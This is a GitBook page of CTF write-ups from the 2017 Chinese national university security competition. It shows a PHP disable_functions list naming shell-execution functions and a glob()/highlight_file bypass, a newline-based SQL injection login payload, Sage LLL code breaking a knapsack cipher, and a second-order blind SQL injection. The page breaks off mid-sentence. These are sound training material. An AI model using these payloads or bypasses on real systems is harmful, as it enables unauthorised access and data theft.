
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>2017全国信安赛 · CTF Writeup</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        <meta name="author" content="Yunen <yunen@cqu.edu.cn>">
        
        
    
    <link rel="stylesheet" href="../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-splitter/splitter.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-anchors/plugin.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-prism/prism.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search-plus/search.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-anchor-navigation-ex/style/plugin.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fancybox/jquery.fancybox.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fancybox/jquery.fancybox-buttons.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="xihulunjian2019.html" />
    
    
    <link rel="prev" href="2019ddctf.html" />
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    
    
        
        <li>
            <a href="/" target="_blank" class="custom-link">首页</a>
        </li>
    
    

    
    <li class="divider"></li>
    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../">
            
                <a href="../">
            
                    
                    介绍
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" data-path="../types/">
            
                <a href="../types/">
            
                    
                    按类型区分
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.1" data-path="../types/web.html">
            
                <a href="../types/web.html">
            
                    
                    网上练习题
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.2" data-path="../types/comp.html">
            
                <a href="../types/comp.html">
            
                    
                    官方赛事题
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.3" data-path="../years/">
            
                <a href="../years/">
            
                    
                    按年份区分
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.3.1" data-path="../years/2020.html">
            
                <a href="../years/2020.html">
            
                    
                    2019-2020
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.2" data-path="../years/2019.html">
            
                <a href="../years/2019.html">
            
                    
                    2018-2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.3" data-path="../years/2018.html">
            
                <a href="../years/2018.html">
            
                    
                    2017-2018
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.4" data-path="../years/2017.html">
            
                <a href="../years/2017.html">
            
                    
                    2016-2017
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.5" data-path="../years/2016.html">
            
                <a href="../years/2016.html">
            
                    
                    2015-2016
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.6" data-path="../years/2015.html">
            
                <a href="../years/2015.html">
            
                    
                    ????-2015
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4" data-path="../difficult/">
            
                <a href="../difficult/">
            
                    
                    按难度区分
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.1" data-path="../difficult/easy.html">
            
                <a href="../difficult/easy.html">
            
                    
                    相对简单
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2" data-path="../difficult/mid.html">
            
                <a href="../difficult/mid.html">
            
                    
                    难度中等
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.3" data-path="../difficult/diff.html">
            
                <a href="../difficult/diff.html">
            
                    
                    难度较大
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.5" data-path="all.html">
            
                <a href="all.html">
            
                    
                    目前已收录
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.5.1" data-path="2019national.html">
            
                <a href="2019national.html">
            
                    
                    2019全国信安赛
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.2" data-path="2019ddctf.html">
            
                <a href="2019ddctf.html">
            
                    
                    2019DDCTF
            
                </a>
            

            
        </li>
    
        <li class="chapter active" data-level="1.5.3" data-path="2017national.html">
            
                <a href="2017national.html">
            
                    
                    2017全国信安赛
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4" data-path="xihulunjian2019.html">
            
                <a href="xihulunjian2019.html">
            
                    
                    2019西湖论剑预选赛
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.5" data-path="shiyanbar_web.html">
            
                <a href="shiyanbar_web.html">
            
                    
                    实验吧web部分
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.6" data-path="../help.html">
            
                <a href="../help.html">
            
                    
                    加入我们完善网站!
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7" data-path="../reply.html">
            
                <a href="../reply.html">
            
                    
                    有问题?请在这里反馈!
            
                </a>
            

            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href=".." >2017全国信安赛</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div class="search-plus" id="book-search-results">
    <div class="search-noresults">
    
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <div id="anchor-navigation-ex-navbar"><i class="fa fa-navicon"></i><ul><li><span class="title-icon "></span><a href="#2017&#x5168;&#x56FD;&#x5927;&#x5B66;&#x751F;&#x4FE1;&#x606F;&#x5B89;&#x5168;&#x7ADE;&#x8D5B;"><b>1. </b>2017&#x5168;&#x56FD;&#x5927;&#x5B66;&#x751F;&#x4FE1;&#x606F;&#x5B89;&#x5168;&#x7ADE;&#x8D5B;</a></li><ul><li><span class="title-icon "></span><a href="#&#x9898;&#x76EE;&#x7C7B;&#x578B;&#xFF1A;"><b>1.1. </b>&#x9898;&#x76EE;&#x7C7B;&#x578B;&#xFF1A;</a></li></ul><li><span class="title-icon "></span><a href="#&#x9898;&#x76EE;&#x4E0B;&#x8F7D;&#xFF1A;"><b>2. </b>&#x9898;&#x76EE;&#x4E0B;&#x8F7D;&#xFF1A;</a></li><li><span class="title-icon "></span><a href="#&#x7F51;&#x4E0A;&#x516C;&#x5F00;wp"><b>3. </b>&#x7F51;&#x4E0A;&#x516C;&#x5F00;WP:</a></li><li><span class="title-icon "></span><a href="#&#x7F51;&#x4E0A;&#x516C;&#x5F00;wp_1"><b>4. </b>&#x7F51;&#x4E0A;&#x516C;&#x5F00;WP:</a></li><li><span class="title-icon "></span><a href="#&#x672C;&#x7AD9;&#x5907;&#x4EFD;wp&#xFF1A;"><b>5. </b>&#x672C;&#x7AD9;&#x5907;&#x4EFD;WP&#xFF1A;</a></li><ul><li><span class="title-icon "></span><a href="#web"><b>5.1. </b>web</a></li><ul><li><span class="title-icon "></span><a href="#&#x4E00;php-execise"><b>5.1.1. </b>&#x4E00;.PHP execise</a></li><li><span class="title-icon "></span><a href="#web-250"><b>5.1.2. </b>web 250</a></li><li><span class="title-icon "></span><a href="#8classical"><b>5.1.3. </b>8.Classical</a></li><li><span class="title-icon "></span><a href="#10flag-bending-machine"><b>5.1.4. </b>10.flag bending machine</a></li><li><span class="title-icon "></span><a href="#14guestbook"><b>5.1.5. </b>14.Guestbook</a></li><li><span class="title-icon "></span><a href="#16&#x65B9;&#x821F;&#x8BA1;&#x5212;"><b>5.1.6. </b>16.&#x65B9;&#x821F;&#x8BA1;&#x5212;</a></li></ul><li><span class="title-icon "></span><a href="#&#x4E8C;&#x3001;reverse"><b>5.2. </b>&#x4E8C;&#x3001;REVERSE</a></li><ul><li><span class="title-icon "></span><a href="#2&#x586B;&#x6570;&#x6E38;&#x620F;"><b>5.2.1. </b>2.&#x586B;&#x6570;&#x6E38;&#x620F;</a></li><li><span class="title-icon "></span><a href="#5apk-crack"><b>5.2.2. </b>5.apk crack</a></li><li><span class="title-icon "></span><a href="#17&#x6EAF;&#x6E90;"><b>5.2.3. </b>17.&#x6EAF;&#x6E90;</a></li></ul><li><span class="title-icon "></span><a href="#&#x4E09;&#x3001;pwn"><b>5.3. </b>&#x4E09;&#x3001;PWN</a></li><ul><li><span class="title-icon "></span><a href="#3easyheap"><b>5.3.1. </b>3.easyheap</a></li><li><span class="title-icon "></span><a href="#9babydriver"><b>5.3.2. </b>9.BabyDriver</a></li><li><span class="title-icon "></span><a href="#18notformat"><b>5.3.3. </b>18.NotFormat</a></li></ul><li><span class="title-icon "></span><a href="#&#x4E09;&#x3001;misc"><b>5.4. </b>&#x4E09;&#x3001;MISC</a></li><ul><li><span class="title-icon "></span><a href="#4&#x4F20;&#x611F;&#x5668;1"><b>5.4.1. </b>4.&#x4F20;&#x611F;&#x5668;1</a></li><li><span class="title-icon "></span><a href="#6warmup"><b>5.4.2. </b>6.warmup</a></li><li><span class="title-icon "></span><a href="#12badhacker"><b>5.4.3. </b>12.badhacker</a></li><li><span class="title-icon "></span><a href="#13&#x4F20;&#x611F;&#x5668;2"><b>5.4.4. </b>13.&#x4F20;&#x611F;&#x5668;2</a></li><li><span class="title-icon "></span><a href="#15embarrass"><b>5.4.5. </b>15.embarrass</a></li></ul><li><span class="title-icon "></span><a href="#&#x56DB;&#x3001;crypto"><b>5.5. </b>&#x56DB;&#x3001;Crypto</a></li><ul><li><span class="title-icon "></span><a href="#11partial"><b>5.5.1. </b>11.partial</a></li></ul></ul></ul></div><a href="#2017&#x5168;&#x56FD;&#x5927;&#x5B66;&#x751F;&#x4FE1;&#x606F;&#x5B89;&#x5168;&#x7ADE;&#x8D5B;" id="anchorNavigationExGoTop"><i class="fa fa-arrow-up"></i></a><h1 id="2017&#x5168;&#x56FD;&#x5927;&#x5B66;&#x751F;&#x4FE1;&#x606F;&#x5B89;&#x5168;&#x7ADE;&#x8D5B;"><a name="2017&#x5168;&#x56FD;&#x5927;&#x5B66;&#x751F;&#x4FE1;&#x606F;&#x5B89;&#x5168;&#x7ADE;&#x8D5B;" class="anchor-navigation-ex-anchor" href="#2017&#x5168;&#x56FD;&#x5927;&#x5B66;&#x751F;&#x4FE1;&#x606F;&#x5B89;&#x5168;&#x7ADE;&#x8D5B;"><i class="fa fa-link" aria-hidden="true"></i></a>1. 2017&#x5168;&#x56FD;&#x5927;&#x5B66;&#x751F;&#x4FE1;&#x606F;&#x5B89;&#x5168;&#x7ADE;&#x8D5B;</h1>
<h2 id="&#x9898;&#x76EE;&#x7C7B;&#x578B;&#xFF1A;"><a name="&#x9898;&#x76EE;&#x7C7B;&#x578B;&#xFF1A;" class="anchor-navigation-ex-anchor" href="#&#x9898;&#x76EE;&#x7C7B;&#x578B;&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a>1.1. &#x9898;&#x76EE;&#x7C7B;&#x578B;&#xFF1A;</h2>
<table>
<thead>
<tr>
<th style="text-align:center">&#x7C7B;&#x578B;</th>
<th style="text-align:center">&#x5E74;&#x4EFD;</th>
<th style="text-align:center">&#x96BE;&#x5EA6;</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">&#x5B98;&#x65B9;&#x8D5B;&#x4E8B;&#x9898;</td>
<td style="text-align:center">2017</td>
<td style="text-align:center">&#x4E2D;</td>
</tr>
</tbody>
</table>
<h1 id="&#x9898;&#x76EE;&#x4E0B;&#x8F7D;&#xFF1A;"><a name="&#x9898;&#x76EE;&#x4E0B;&#x8F7D;&#xFF1A;" class="anchor-navigation-ex-anchor" href="#&#x9898;&#x76EE;&#x4E0B;&#x8F7D;&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a>2. &#x9898;&#x76EE;&#x4E0B;&#x8F7D;&#xFF1A;</h1>
<ul>
<li>&#x6682;&#x65E0;</li>
</ul>
<h1 id="&#x7F51;&#x4E0A;&#x516C;&#x5F00;wp"><a name="&#x7F51;&#x4E0A;&#x516C;&#x5F00;wp" class="anchor-navigation-ex-anchor" href="#&#x7F51;&#x4E0A;&#x516C;&#x5F00;wp"><i class="fa fa-link" aria-hidden="true"></i></a>3. &#x7F51;&#x4E0A;&#x516C;&#x5F00;WP:</h1>
<ul>
<li><a href="https://www.anquanke.com/post/id/86431" target="_blank">https://www.anquanke.com/post/id/86431</a></li>
<li><a href="https://p0sec.net/index.php/archives/107/" target="_blank">https://p0sec.net/index.php/archives/107/</a></li>
<li><a href="https://blog.csdn.net/csu_vc/article/details/78011716" target="_blank">https://blog.csdn.net/csu_vc/article/details/78011716</a></li>
<li><a href="https://blog.csdn.net/aptx4869_li/article/details/80589250" target="_blank">https://blog.csdn.net/aptx4869_li/article/details/80589250</a></li>
</ul>
<h1 id="&#x7F51;&#x4E0A;&#x516C;&#x5F00;wp_1"><a name="&#x7F51;&#x4E0A;&#x516C;&#x5F00;wp_1" class="anchor-navigation-ex-anchor" href="#&#x7F51;&#x4E0A;&#x516C;&#x5F00;wp_1"><i class="fa fa-link" aria-hidden="true"></i></a>4. &#x7F51;&#x4E0A;&#x516C;&#x5F00;WP:</h1>
<ul>
<li>&#x6682;&#x65E0;</li>
</ul>
<h1 id="&#x672C;&#x7AD9;&#x5907;&#x4EFD;wp&#xFF1A;"><a name="&#x672C;&#x7AD9;&#x5907;&#x4EFD;wp&#xFF1A;" class="anchor-navigation-ex-anchor" href="#&#x672C;&#x7AD9;&#x5907;&#x4EFD;wp&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a>5. &#x672C;&#x7AD9;&#x5907;&#x4EFD;WP&#xFF1A;</h1>
<p><strong>&#x4F5C;&#x8005;&#xFF1A;FlappyPig</strong></p>
<h2 id="web"><a name="web" class="anchor-navigation-ex-anchor" href="#web"><i class="fa fa-link" aria-hidden="true"></i></a>5.1. web</h2>
<h3 id="&#x4E00;php-execise"><a name="&#x4E00;php-execise" class="anchor-navigation-ex-anchor" href="#&#x4E00;php-execise"><i class="fa fa-link" aria-hidden="true"></i></a>5.1.1. &#x4E00;.PHP execise</h3>
<p>&#x7C7B;&#x578B;&#xFF1A;WEB    &#x5206;&#x503C;&#xFF1A;150&#x5206;<br>&#x76F4;&#x63A5;&#x5C31;&#x80FD;&#x6267;&#x884C;&#x4EE3;&#x7801;&#xFF0C;&#x5148;&#x6267;&#x884C;phpinfo(),&#x53D1;&#x73B0;&#x7981;&#x7528;&#x4E86;&#x5982;&#x4E0B;&#x51FD;&#x6570;  </p>
<pre class="language-"><code>assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,pcntl_alarm,
pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,
pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,
pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,
pcntl_exec,pcntl_getpriority,pcntl_setpriority,fopen,file_get_contents,fread,file_get_contents,
file,readfile,opendir,readdir,closedir,rewinddir,
</code></pre><p>&#x7136;&#x540E;&#x901A;&#x8FC7;<br><code>foreach (glob(&quot;./*&quot;) as $filename) {  echo $filename.&quot;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>&quot;; }</code>  </p>
<blockquote>
<p>glob()&#x51FD;&#x6570;&#x7ECF;&#x5E38;&#x7528;&#x4E8E;disable_function()&#x7684;&#x7ED5;&#x8FC7;&#xFF0C;&#x8BE5;&#x51FD;&#x6570;&#x7684;&#x4F5C;&#x7528;&#x662F;&#x8FD4;&#x56DE;&#x5339;&#x914D;&#x6307;&#x5B9A;&#x6A21;&#x5F0F;&#x7684;&#x6587;&#x4EF6;&#x540D;&#x6216;&#x76EE;&#x5F55;&#x3002; &#x8BE5;&#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x5305;&#x542B;&#x6709;&#x5339;&#x914D;&#x6587;&#x4EF6; / &#x76EE;&#x5F55;&#x7684;&#x6570;&#x7EC4;&#x3002;&#x5982;&#x679C;&#x51FA;&#x9519;&#x8FD4;&#x56DE; false&#x3002;</p>
</blockquote>
<p>&#x5217;&#x51FA;&#x5F53;&#x524D;&#x76EE;&#x5F55;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x7528;highlight_file()&#x51FD;&#x6570;&#x8BFB;&#x53D6;flag&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x5373;&#x53EF;  </p>
<blockquote>
<p>&#x6B64;&#x5904;&#x8FD8;&#x53EF;&#x7528;shou_source&#x51FD;&#x6570;</p>
</blockquote>
<h3 id="web-250"><a name="web-250" class="anchor-navigation-ex-anchor" href="#web-250"><i class="fa fa-link" aria-hidden="true"></i></a>5.1.2. web 250</h3>
<p>&#x9996;&#x5148;&#x901A;&#x8FC7;svn&#x6CC4;&#x9732;&#x83B7;&#x53D6;&#x5230;&#x6E90;&#x7801;&#xFF0C;&#x7136;&#x540E;&#x89C2;&#x5BDF;&#x53D1;&#x73B0;&#x4E3B;&#x8981;&#x90E8;&#x5206;&#x5728;login.php&#x8FD9;&#x91CC;<br>     <a href="http://p8.qhimg.com/t015b1c51f5d4e2c9f8.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://p8.qhimg.com/t015b1c51f5d4e2c9f8.png" alt="">
     </a>  </p>
<pre class="language-"><code>&lt;?php
defined(&apos;black_hat&apos;) or header(&apos;Location: route.php?act=login&apos;);
session_start();
include_once &quot;common.php&quot;;
$connect=mysql_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;xxxxxx&quot;) or die(&quot;there is no ctf!&quot;);
mysql_select_db(&quot;hats&quot;) or die(&quot;there is no hats!&quot;);
if (isset($_POST[&quot;name&quot;])){
  $name = str_replace(&quot;&apos;&quot;, &quot;&quot;, trim(waf($_POST[&quot;name&quot;])));
  if (strlen($name) &gt; 11){
    echo(&quot;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span>alert(&apos;name too long&apos;)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>&quot;);
  }else{
    $sql = &quot;select count(*) from t_info where username = &apos;$name&apos; or nickname = &apos;$name&apos;&quot;;
    echo $sql;
    $result = mysql_query($sql);
    $row = mysql_fetch_array($result);
    if ($row[0]){
      $_SESSION[&apos;hat&apos;] = &apos;black&apos;;
      echo &apos;good job&apos;;
    }else{
    $_SESSION[&apos;hat&apos;] = &apos;green&apos;;
    }
    header(&quot;Location: index.php&quot;);
  }
}
</code></pre><p>&#x7531;index.php&#x4E2D;&#x4EE3;&#x7801;:
     <a href="http://p3.qhimg.com/t019185040a918a5ea5.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://p3.qhimg.com/t019185040a918a5ea5.png" alt="">
     </a></p>
<p>&#x5F53;<code>$_SESSION[&apos;hat&apos;] = &apos;black&apos;</code>;&#x65F6;&#xFF0C;&#x5728;index.php&#x4E0B;&#x9762;&#x5C31;&#x80FD;&#x83B7;&#x53D6;&#x5230;flag&#xFF0C; &#x4F46;&#x662F;&#x6211;&#x4EEC;&#x6CE8;&#x518C;&#x65F6;&#x5019;&#x63D2;&#x5165;&#x7684;&#x8868;&#x662F;t_user&#xFF0C;&#x800C;&#x8FD9;&#x91CC;&#x767B;&#x9646;&#x67E5;&#x8BE2;&#x7684;&#x8868;&#x662F;t_info,&#x6240;&#x4EE5;&#x601D;&#x8DEF;&#x5C31;&#x53EA;&#x6709;&#x60F3;&#x529E;&#x6CD5;&#x5728;login&#x8FD9;&#x91CC;&#x6CE8;&#x5165;&#xFF0C;&#x7ED3;&#x5408;login.php&#x5206;&#x6790;&#x53EF;&#x77E5;&#xFF0C;&#x5728;login.php&#x4E2D;&#xFF0C;&#x7B2C;5&#x884C;&#xFF0C;&#x4F46;&#x4F1A;&#x7ED3;&#x679C;&#x4E0D;&#x4E3A;&#x7A7A;&#xFF0C;&#x5373;&#x53EF;&#x3002;
&#x56E0;&#x6B64;&#x6784;&#x9020;poc 
     <a href="http://p9.qhimg.com/t01e22a58487cc59edf.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://p9.qhimg.com/t01e22a58487cc59edf.png" alt="">
     </a>
     <a href="http://p8.qhimg.com/t014290d185869d0488.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://p8.qhimg.com/t014290d185869d0488.png" alt="">
     </a></p>
<p>&#x6700;&#x540E;&#x6784;&#x9020;&#x7684;payload&#x5982;&#x4E0B;&#xFF1A;</p>
<p><code>name=or%0a1=1%0a#&apos;&amp;submit=check</code>
&#x6210;&#x529F;&#x83B7;&#x53D6;&#x5230;flag&#x4E3A;flag{good_job_white_hat}</p>
<h3 id="8classical"><a name="8classical" class="anchor-navigation-ex-anchor" href="#8classical"><i class="fa fa-link" aria-hidden="true"></i></a>5.1.3. 8.Classical</h3>
<p>&#x7C7B;&#x578B;&#xFF1A;web    &#x5206;&#x503C;&#xFF1A;300&#x5206;</p>
<p>&#x9898;&#x76EE;&#x7C7B;&#x4F3C;WCTF&#x67D0;&#x539F;&#x9898;&#x3002;</p>
<p>&#x52A0;&#x5BC6;&#x4EE3;&#x7801;&#x751F;&#x6210;&#x4E86;&#x8D85;&#x9012;&#x589E;&#x7684;sk&#x540E;&#xFF0C;&#x4F7F;&#x7528;sk * mask % N&#x4F5C;&#x4E3A;pk&#x8FDB;&#x884C;&#x4F7F;&#x7528;&#x3002;flag&#x88AB;&#x7528;&#x4E8E;&#x9009;&#x53D6;pk&#x6C42;&#x548C;&#x5F97;&#x5230;sum&#x3002;</p>
<p>&#x662F;&#x5178;&#x578B;&#x7684;Knapsack problem&#xFF0C;&#x4F7F;&#x7528;Shamir Attack&#x8FDB;&#x884C;&#x653B;&#x51FB;&#x3002;&#x5728;github&#x4E0A;&#x6709;&#x5F88;&#x591A;&#x6B64;&#x7C7B;&#x52A0;&#x5BC6;&#x65B9;&#x6848;&#x7684;&#x653B;&#x51FB;&#x529E;&#x6CD5;&#xFF1A;</p>
<p><a href="https://github.com/taniayu/merklehellman-lll-attack" target="_blank">https://github.com/taniayu/merklehellman-lll-attack</a> </p>
<p><a href="https://github.com/kutio/liblll" target="_blank">https://github.com/kutio/liblll</a> </p>
<p><a href="https://github.com/sonickun/ctf-crypto-writeups/tree/4c0841a344bc6ce64726bdff4616fe771eb69d1e/2015/plaid-ctf/lazy" target="_blank">https://github.com/sonickun/ctf-crypto-writeups/tree/4c0841a344bc6ce64726bdff4616fe771eb69d1e/2015/plaid-ctf/lazy</a> </p>
<p>&#x653B;&#x51FB;&#x65B9;&#x6CD5;&#x4E3A;&#x9996;&#x5148;&#x6784;&#x9020;&#x77E9;&#x9635;&#xFF0C;&#x901A;&#x8FC7;lllattack&#x6C42;&#x5F97;&#x65B0;&#x7684;&#x77E9;&#x9635;&#xFF0C;&#x9009;&#x53D6;&#x6700;&#x77ED;&#x7684;&#x5411;&#x91CF;&#x5373;&#x53EF;&#x3002;</p>
<pre class="language-"><code>c=956576997571830839619219661891070912231751993511506911202000405564746186955706649863934091672487787498081924933879394165075076706512215856854965975765348320274158673706628857968616084896877423278655939177482064298058099263751625304436920987759782349778415208126371993933473051046236906772779806230925293741699798906569
pubkey=[&#xFF08;&#x81EA;&#x5DF1;&#x53BB;&#x590D;&#x5236;&#x5427;&#xFF09;]
from Crypto.Util.number import long_to_bytes as l2b
def create_matrix(pub, c):
    n = len(pub)
    i = matrix.identity(n) * 2
    last_col = [-1] * n
    first_row = []
    for p in pub:
        first_row.append(int(long(p)))
    first_row.append(-c)
    m = matrix(ZZ, 1, n+1, first_row)
    bottom = i.augment(matrix(ZZ, n, 1, last_col))
    m = m.stack(bottom)
    return m
def is_target_value(V):
    for v in V:
        if v!=-1 and v!=1:
            return False
    return True
def find_shortest_vector(matrix):
    for col in matrix.columns():
        if col[0] == 0 and is_target_value(col[1:]):
            return col
        else:
            continue
pub = pubkey
c = c
m = create_matrix(pub, c)
lllm = m.transpose().LLL().transpose()
shortest_vector = find_shortest_vector(lllm)
print shortest_vector
x = &quot;&quot;
for v in shortest_vector[1:]:
    if v == 1:
        x += &quot;1&quot;
    elif v == -1:
        x += &quot;0&quot;
print x
print hex(int(x,2))[2:-1].decode(&quot;hex&quot;)
#flag{M3k13_he11M4N_1ik3s_1Att1ce}
</code></pre><h3 id="10flag-bending-machine"><a name="10flag-bending-machine" class="anchor-navigation-ex-anchor" href="#10flag-bending-machine"><i class="fa fa-link" aria-hidden="true"></i></a>5.1.4. 10.flag bending machine</h3>
<p>&#x7C7B;&#x578B;&#xFF1A;WEB    &#x5206;&#x503C;&#xFF1A;300&#x5206;</p>
<p>&#x8FDB;&#x53BB;&#x662F;&#x4E00;&#x4E2A;&#x6CE8;&#x518C;&#x53CA;&#x767B;&#x9646;&#xFF0C;&#x7ECF;&#x8FC7;&#x4E00;&#x756A;fuzz&#xFF0C;&#x8BA4;&#x4E3A;&#x6700;&#x6709;&#x53EF;&#x80FD;&#x662F;&#x4E8C;&#x6B21;&#x6CE8;&#x5165; &#x4F8B;&#x5982;&#x6211;&#x6CE8;&#x518C;&#x4E00;&#x4E2A;bendawang&apos; or 1=1#&#x548C;&#x6CE8;&#x518C;&#x4E00;&#x4E2A;bendawang&apos; or 1=0#&#xFF0C;&#x731C;&#x60F3;&#x5728;&#x67E5;&#x8BE2;&#x4F59;&#x989D;&#x65F6;&#x7684;&#x8BED;&#x53E5;&#x4E3A;</p>
<pre class="language-"><code>select xxx from xxx where username=bendawang&apos; or 1=1#
select xxx from xxx where username=bendawang&apos; or 1=0#
</code></pre><p>&#x6240;&#x4EE5;&#x5F88;&#x5BB9;&#x6613;&#x77E5;&#x9053;&#xFF0C;&#x5982;&#x679C;&#x662F;&#x7B2C;&#x4E00;&#x79CD;&#x60C5;&#x51B5;&#xFF0C;&#x540E;&#x9762;&#x7684;or 1=1&#x6052;&#x771F;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x67E5;&#x8BE2;&#x7684;&#x7ED3;&#x679C;&#x662F;&#x6574;&#x4E2A;&#x8868;&#x7684;&#x7ED3;&#x679C;&#xFF0C;&#x800C;&#x7B2C;&#x4E8C;&#x4E2A;&#x5219;&#x662F;&#x7528;&#x6237;&#x540D;&#x4E3A;bendawang&#x7684;&#x7ED3;&#x679C;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;&#x731C;&#x60F3;&#x67E5;&#x8BE2;&#x591A;&#x4E2A;&#x7ED3;&#x679C;&#x65F6;&#x53D6;&#x7B2C;&#x4E00;&#x4E2A;&#x7684;&#x8BDD;&#xFF0C;&#x5982;&#x679C;&#x6211;&#x8D2D;&#x4E70;&#x4E86;&#x4E1C;&#x897F;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x7B2C;&#x4E00;&#x79CD;&#x60C5;&#x51B5;&#x663E;&#x793A;&#x7684;&#x4F59;&#x989D;&#x662F;&#x4E0D;&#x53D8;&#x7684;&#xFF0C;&#x800C;&#x7B2C;&#x4E8C;&#x79CD;&#x60C5;&#x51B5;&#x662F;&#x4F1A;&#x53D8;&#x7684;&#x3002;&#x5C31;&#x53EF;&#x4EE5;&#x6839;&#x636E;&#x8FD9;&#x4E2A;&#x70B9;&#x6765;&#x8FDB;&#x884C;&#x4E8C;&#x5206;&#x76F2;&#x6CE8;&#x3002; &#x53E6;&#x5916;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x9898;&#x76EE;&#x8FC7;&#x6EE4;&#x4E86;&#x4E00;&#x4E9B;&#x5173;&#x952E;&#x5B57;&#xFF0C;select ,from 